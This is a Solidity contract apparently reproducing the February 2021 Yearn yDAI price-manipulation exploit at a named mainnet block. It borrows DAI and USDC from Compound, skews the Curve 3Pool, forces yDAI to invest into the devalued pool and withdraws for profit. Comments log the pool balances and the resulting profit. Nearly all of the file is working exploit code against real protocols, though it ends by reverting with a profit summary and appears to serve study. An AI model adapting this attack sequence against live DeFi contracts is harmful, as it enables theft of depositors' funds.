// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interface.sol";

// Block 11792260
// Block index 11
// Timestamp Thu, 04 Feb 2021 21:31:21 +0000
// Gas price 390 gwei
// Gas limit 11665684
// TX: 0xf6022012b73770e7e2177129e648980a82aab555f9ac88b8a9cda3ec44b30779


contract Yearn_attack {
    address EOA;
    address private constant WETHAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant DAIAddress = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant cDAIAddress = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643;
    address private constant cETHAddress = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;
    address private constant comptrollerAddress = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;

    address private constant cUSDCAddress = 0x39AA39c021dfbaE8faC545936693aC917d5E7563;
    address private constant USDCAddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant yDAIAddress = 0xACd43E627e64355f1861cEC6d3a6688B31a6F952;
    address private constant CurveFi3PoolAddress = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address private constant USDTAddress = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant Curve3CrvAddress = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;


    address[] private markets = new address[](2);

    ICEther cETH = ICEther(payable(cETHAddress));
    CTokenInterface cDAI = CTokenInterface(cDAIAddress);
    IERC20 DAI = IERC20(DAIAddress);
    CTokenInterface cUSDC = CTokenInterface(cUSDCAddress);
    IERC20 USDC = IERC20(USDCAddress);
    IERC20 USDT = IERC20(USDTAddress);
    yTokenInterface yDAI = yTokenInterface(yDAIAddress);
    CurveFi CURVE_3Pool = CurveFi(CurveFi3PoolAddress);
    IERC20 Crv = IERC20(Curve3CrvAddress);
    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";
    string str5 = "";
    string str6 = "";


    constructor() payable {
        require(msg.value == 217000 ether, "loan amount does not match");
        StandardToken(USDCAddress).approve(CurveFi3PoolAddress, 2**256 - 1);
        StandardToken(DAIAddress).approve(CurveFi3PoolAddress, 2**256 - 1);
        StandardToken(USDTAddress).approve(CurveFi3PoolAddress, 2**256 - 1);
        StandardToken(DAIAddress).approve(cDAIAddress, 2**256 - 1);
        StandardToken(USDCAddress).approve(cUSDCAddress, 2**256 - 1);
        DAI.approve(yDAIAddress, 0);
        DAI.approve(yDAIAddress, 2**256 - 1);
        EOA = msg.sender;
    }

    receive() external payable {}


    // loan amount =  129M DAI, 134M USDC
    function attack() public {
        markets[0] = cETHAddress;
        markets[1] = cDAIAddress;
        ComptrollerInterface comptroller = ComptrollerInterface(comptrollerAddress);
        comptroller.enterMarkets(markets);

        cETH.mint{value: 216815 ether}();
        cDAI.borrow(129104909752745108254490624);

        markets[0] = cETHAddress;
        markets[1] = cUSDCAddress;
        comptroller.enterMarkets(markets);
        cUSDC.borrow(134000000000005);
        uint[3] memory amounts;
        // ----------------------------------------------------------------------------------------

        // action 1: DAI, USDC -> 3Crv  State: CURVE_3Pool
        //    State: CURVE_3Pool
        // str5 = CurveBalanceSummary();
        // uint DAIAmountIn = aa * 10 ** 18; // aa = 36090075
        // uint USDCAmountIN = bb * 10 ** 6; // bb = 134000000
        amounts = [uint256(36090075399968404463943680), uint256(134000000000000), 0];
        // uint[3] memory amounts = [aa * 10 ** 18, bb * 10 ** 6, 0];
        CURVE_3Pool.add_liquidity(amounts, 0);


        // Curve DAI amount: 207765963 713402364058705980 Curve USDC amount: 227557960 647030 Curve USDT amount: 192118527 623627
        // Curve DAI amount: 243854525 051894992214916169 Curve USDC amount: 361552533 543492 Curve USDT amount: 192114624 688045
        // CrvOut: 168166947 284003592915283060


        // action 2: 3Crv -> USDT   State: CURVE_3Pool      // Further devalue DAI
        //       State: CURVE_3Pool
        amounts = [0, 0, uint256(165927602807868)];
        CURVE_3Pool.remove_liquidity_imbalance(amounts, 300000000000000000000000000);
        // Curve DAI amount: 243854525051894992214916169 Curve USDC amount: 361552533543492 Curve USDT amount: 192114624688045
        // Curve DAI amount: 243850650911475404062962591 Curve USDC amount: 361546789523431 Curve USDT amount: 26177629453586
        // 3Crv spent: 167190395 314694317307156601


        // remove_liquidity_imbalance(_amounts: uint256[N_COINS], _max_burn_amount:uint256) →uint256Wit



        // action 3: DAI -> yDAI    State: yDAI, CURVE_3Pool
        //       State: yDAI, CURVE_3Pool
        // yDAI.deposit(cc * 10 ** 4 * 10 ** 18); // cc = 9301
        yDAI.deposit(DAI.balanceOf(address(this)) );     // get the share of yDAI
        yDAI.earn();                                    // Force invest DAI to 3Pool where DAI is devalued.
        // reach a state of "USDT light"

        // DAI balance of yDAI: 13369646724806413286288 yDAI supply of yDAI:  31561046240499641056490553
        // DAI spent: 93014834352776703790546944

        // DAI balance of yDAI: 930282039995015102038333 yDAI supply of yDAI: 130763790930939816639762309
        // CurveDAIIncrease: 92093669083593352556132538

        // So Curve DAI balance  335944320

        // yDAI got: 99202744 690440175583271756


        // action 1: USDT -> 3Crv  State: CURVE_3Pool   // Add USDT
        //    State: CURVE_3Pool                        // reach a state of "USDT heavy"

        // amounts = [0, 0, dd * 10 ** 4 * 10 ** 6]; // dd = 16592 7602
        amounts = [0, 0, uint256(165927602807868)];
        CURVE_3Pool.add_liquidity(amounts, 0);


        // Curve DAI amount: 335944319995068756619095129 Curve USDC amount: 361542853858449 Curve USDT amount: 26177344493569
        // Curve DAI amount: 335938376454880617573395439 Curve USDC amount: 361536457427988 Curve USDT amount: 192092965861840
        // Crv_got: 167941815 792617069349180537


        // action 5: yDAI -> DAI  State: Curve, yDAI
        //    State: Curve, yDAI
        // 99202744690440175583271756
        // yDAI.withdraw(yDAIIn);
        yDAI.withdraw(yDAI.balanceOf(address(this)));


        // DAI balance of yDAI: 930282039995015102038333 yDAI supply of yDAI: 130763790930939816639762309
        // DAI balance of yDAI: 11026289217677132964908 yDAI supply of yDAI: 31561046240499641056490553
        // CurveDAIdecrease: 91424320246023229124514017
        // DAIgot: 92335043596687181738286159




        // action 6: 3Crv -> DAI, USDC   State: Curve
        //          State: Curve

        str5 = CurveBalanceSummary();
        uint CRVCost = Crv.balanceOf(address(this));
        uint DAIAmount = 129104909752745108254490624 + 1 - DAI.balanceOf(address(this));
        amounts =  [uint256(DAIAmount), uint256(134000000000001), 0]; // DAIAmount = 36769866 156057 926516 204466
        CURVE_3Pool.remove_liquidity_imbalance(amounts, 300000000000000000000000000);
        str6 = CurveBalanceSummary();
        CRVCost = CRVCost - Crv.balanceOf(address(this));



        // Curve DAI amount: 244514056208857388448881422 Curve USDC amount: 361536457427988 Curve USDT amount: 192092965861840
        // Curve DAI amount: 207743026527149335672592161 Curve USDC amount: 227532205378829 Curve USDT amount: 192089885271902
        // Crv_cost: 168862032  686133347716888232
        // DAI_got: 36769866    USDC_got: 134000000




        revert(ProfitSummary());


        // USDT balance: 0
        // USDC balance: 134000000000006
        // DAI balance: 129104909752745108254490625
        // 3Crv balance: 56335 075792997240418764
        // Profit: 56335

    }

    function yDAISummary() internal returns (string memory _uintAsString){
        uint balance = DAI.balanceOf(yDAIAddress);
        uint supply = yDAI.totalSupply();
        str1 = append("DAI balance of yDAI: ", uint2str(balance));
        str2 = append("yDAI supply of yDAI: ", uint2str(supply));
        return appendWithSpace(str1, str2);

    }



    function CurveBalanceSummary() internal returns (string memory _uintAsString){
        uint balance1 = CURVE_3Pool.balances(0);  // DAI
        uint balance2 = CURVE_3Pool.balances(1);  // USDC
        uint balance3 = CURVE_3Pool.balances(2);  // USDT
        str1 = append("Curve DAI amount: ", uint2str(balance1));
        str2 = append(" Curve USDC amount: ", uint2str(balance2));
        str3 = append(" Curve USDT amount: ", uint2str(balance3));
        return append(append(str1, str2), str3);
    }

    function ProfitSummary() internal returns (string memory _uintAsString){
        uint balance0 = USDT.balanceOf(address(this));
        uint balance1 = USDC.balanceOf(address(this));
        uint balance2 = DAI.balanceOf(address(this));
        uint balance = Curve3CrvToken(Curve3CrvAddress).balanceOf(address(this));
        str1 = append("USDT balance: ", uint2str(balance0));
        str2 = append("USDC balance: ", uint2str(balance1));
        str3 = append("DAI balance: ", uint2str(balance2));
        str4 = append("3Crv balance: ", uint2str(balance));

        return appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(str3, str4));
    }


    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }


    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }

}
